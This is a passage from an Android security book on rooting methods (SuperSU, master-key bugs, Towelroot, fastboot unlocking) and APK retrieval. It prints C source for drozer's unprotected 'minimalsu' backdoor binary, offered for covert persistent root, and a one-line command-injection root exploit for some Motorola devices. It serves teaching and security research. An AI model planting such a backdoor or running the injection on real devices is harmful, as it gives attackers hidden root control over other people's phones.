### Optimized Text

For the operating system to locate a file, it must know its path on the system. When using `su` on a Linux system, the command prompts for the target user's password to authenticate the action. However, on Android, a different approach is typically used because the root user does not have a password. Different root manager applications use various technical methods, but they all follow the same basic concept for the user. When an application executes `su`, a request is displayed to the user, asking for permission to grant the requesting application root context. These applications usually provide information about the application requesting root and the command it intends to execute. Figure 6.10 shows an example of such a prompt from the SuperSU application.

**Figure 6.10: The prompt displayed by SuperSU to allow an application access to root context.**

SuperSU works by using a custom version of `su` that sends a broadcast directly to a broadcast receiver within the SuperSU application. This broadcast includes the requesting application’s information and details about the command to be executed as root. Once the broadcast is received, the application displays a prompt to the user with the provided information. The `su` binary then checks a file in the private data directory to determine whether the user has granted permission. Based on the user's decision, `su` decides whether to set the effective user ID (setuid) to 0, which grants root access.

The process described above explains how you can allow applications to execute commands as root in a user-controlled manner, which is theoretically safe. Another objective for an attacker might be to gain persistent root access on a device without the user noticing. For this purpose, drozer includes a completely unprotected custom version of `su` as part of the `tools.setup.minimalsu` module. This version is intended for post-exploitation on older devices and should not be used for everyday purposes. Here is the code for it:

```c
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv) {
    if (setgid(0) || setuid(0)) {
        fprintf(stderr, "su: permission denied\n");
    } else {
        char *args[argc + 1];
        args[0] = "sh";
        args[argc] = NULL;
        int i;
        for (i = 1; i < argc; i++) {
            args[i] = argv[i];
        }
        execvp("sh", args);
    }
    return 0;
}
```

In another scenario, an attacker could exploit a vulnerability in the parsing of user input to inject a command. For example, the following command could be used to gain a root shell on the device:

```sh
$ cmdclient misc_command ';sh'
#
```

This and other variations have been reported to work on various devices, including a family of Motorola devices and any other device containing the vulnerable binary.

### Master Key Bugs—Exploiting Android AOSP System Code

The "master key" code signing bug, explained earlier in the "Code Signing" section, has significant consequences for Android. It not only allows you to repackage an application without breaking its signatures but also enables you to obtain system access on a device. This level of access can translate to root access, depending on the Android version. The method involves pulling an existing system application from the device that runs under the system context (by specifying a `sharedUserId` of `android.uid.system` in its manifest), modifying the manifest to make it debuggable, and then reinstalling it. With ADB access, you can inject new classes into the newly debuggable application, effectively executing code as the system user. On versions of Android prior to 4.2 (Jelly Bean), converting this to root access is possible by adding configuration commands to `/data/local.prop` that force the ADB daemon to start as root.

This method works on all versions of Android vulnerable to these code-signing issues, which, at the time of writing, was a large majority. A tool named Cydia Impactor, created by Jay Freeman (saurik), automates this process. Figure 6.11 shows the functionality available in Cydia Impactor.

**Figure 6.11: The options available in Cydia Impactor to exploit code-signing bugs and obtain system and root access.**

More information about the exact method used by this tool can be found at [http://www.saurik.com/id/17](http://www.saurik.com/id/17).

### Towelroot—Exploiting Linux Kernel Vulnerabilities on Android

Android inherits many exploitable kernel bugs from the main Linux kernel. An example is CVE-2014-3153, a vulnerability in the futex (fast userspace mutex) mechanism responsible for managing locks in threading. Discovered by Nicholas Allegra (comex) and exploited by George Hotz (geohot) in his widely known exploit, Towelroot, this vulnerability can be used to gain root access on many Android devices. Towelroot was notable for being the first to allow rooting of a Samsung Galaxy S5. Any device with a kernel build date before June 16, 2014, and a kernel version greater than 2.6.29 is vulnerable, according to Bill Anderson. Exploits for this vulnerability can be used to gain root access from an ADB shell or any application without specific permissions, making it highly dangerous.

### Using an Unlocked Bootloader

Some devices come with a user-unlockable bootloader, allowing you to flash new firmware. Various methods can be used to obtain root access with an unlocked bootloader, such as flashing a new recovery image or a pre-rooted kernel image that already contains the `su` binary. This may void the warranty of your device or, if done incorrectly, leave your device in an irrecoverable state.

#### Flashing a Custom Recovery Image onto a Nexus Device

The bootloader on Google Nexus devices uses a protocol called fastboot, which allows low-level operations like flashing new firmware, erasing partitions, and unlocking/locking the bootloader. To enter the bootloader, hold both volume buttons and the power button when the device is powered off. Alternatively, use the following command with the device connected to your computer:

```sh
$ adb reboot bootloader
```

This will boot the device into the bootloader, showing options like Start, Restart Bootloader, Recovery mode, and Power off. You can now interact with fastboot from your computer. To check if the device is connected, use the fastboot utility that comes with the Android SDK:

```sh
$ sudo fastboot devices
014691490900600D fastboot
```

Unlock the bootloader with the following command:

```sh
$ sudo fastboot oem unlock
...
OKAY [ 55.995s]
finished. total time: 55.995s
```

This will display a screen asking if you are sure you want to unlock the bootloader and warning that it may void your warranty. If you agree, the screen will return to the bootloader, and it should show "LOCK STATE - UNLOCKED" in the bottom left corner.

At this stage, you can load a custom recovery image, such as ClockWorkMod, which allows you to perform privileged operations like placing the `su` binary on your filesystem. For a simpler method, you can use CF-Autoroot, a custom recovery firmware image created by Chainfire, the developer of SuperSU. CF-Autoroot automatically places SuperSU and the `su` binary on your filesystem and reboots the phone. Download CF-Autoroot from [http://autoroot.chainfire.eu/#fastboot](http://autoroot.chainfire.eu/#fastboot) for your Nexus device. After downloading and unzipping the archive, find the `.img` file and flash it using the following command:

```sh
$ sudo fastboot flash recovery CF-Auto-Root-maguro-yakju-galaxynexus.img
sending 'recovery' (6084 KB)...
OKAY [ 0.816s]
writing 'recovery'...
OKAY [ 0.669s]
finished. total time: 1.485s
```

Scroll to the Recovery Mode option in the bootloader and press the power button to boot into CF-Autoroot. A screen will appear showing the details of the rooting process, and then it will reboot the device. At this point, all the required files for root access have been placed on the device, and it is rooted. Locking the bootloader again after flashing is generally a good idea to prevent unauthorized access. Use the following command to lock the bootloader:

```sh
$ sudo fastboot oem lock
...
OKAY [ 0.126s]
finished. total time: 0.126s
```

Other device manufacturers may provide unlocked bootloaders with different tools and protocols for flashing. For example, Samsung devices can be flashed using the ODIN tool. Many guides are available online for using these tools and finding custom system and recovery images.

### Reverse-Engineering Applications

Reverse-engineering is the process of gaining a deep understanding of a system or application by analyzing the finished product. This section covers the techniques and tools required to reverse engineer Android applications. First, obtaining the APK file of your target application is crucial. This may be an application installed on a device you have or one available on the Play Store (or another app store).

#### Retrieving APK Files

If the application is on a device with ADB access, you can use ADB to retrieve the APK file. Finding the package name of a target application can be tricky. For example, to find the package name of the Twitter application, use the following command:

```sh
$ adb shell pm list packages | grep twitter
package:com.twitter.android
```

For less predictable package names, such as the Terminal Emulator, use drozer's `app.packages.list` command with a filter for the application's label:

```sh
dz> run app.package.list -f "Terminal Emulator"
jackpal.androidterm (Terminal Emulator)
```

To pull the application off the device, find the path where the APK is stored using ADB:

```sh
$ adb shell pm path jackpal.androidterm
package:/data/app/jackpal.androidterm-2.apk
```

Or use drozer's `app.package.info` module:

```sh
dz> run app.package.info -a jackpal.androidterm
Package: jackpal.androidterm
Application Label: Terminal Emulator
Process Name: jackpal.androidterm
Version: 1.0.59
Data Directory: /data/data/jackpal.androidterm
APK Path: /data/app/jackpal.androidterm-2.apk
UID: 10215
GID: [3003, 1015, 1023, 1028]
Shared Libraries: null
Shared User ID: null
Uses Permissions:
- android.permission.INTERNET
- android.permission.WRITE_EXTERNAL_STORAGE
- android.permission.ACCESS_SUPERUSER
- android.permission.WAKE_LOCK
- android.permission.READ_EXTERNAL_STORAGE
Defines Permissions:
- jackpal.androidterm.permission.RUN_SCRIPT
- jackpal.androidterm.permission.APPEND_TO_PATH
- jackpal.androidterm.permission.PREPEND_TO_PATH
```

To reverse engineer applications from the Play Store, install them on a device you own and use the preceding method. If the application is not available in your country, use sites like [http://apkleecher.com/](http://apkleecher.com/) or [http://apps.evozi.com/apk-downloader/](http://apps.evozi.com/apk-downloader/) to download the APK directly.

#### Viewing Manifests

Understanding an Android application often involves reviewing the `AndroidManifest.xml` file. Several tools can be used for this, including the Android Asset Packaging Tool (aapt) that comes with the Android SDK. To dump the manifest of the drozer agent using aapt, use the following command:

```sh
$ aapt dump xmltree /path/to/agent.apk AndroidManifest.xml
N: android=http://schemas.android.com/apk/res/android
```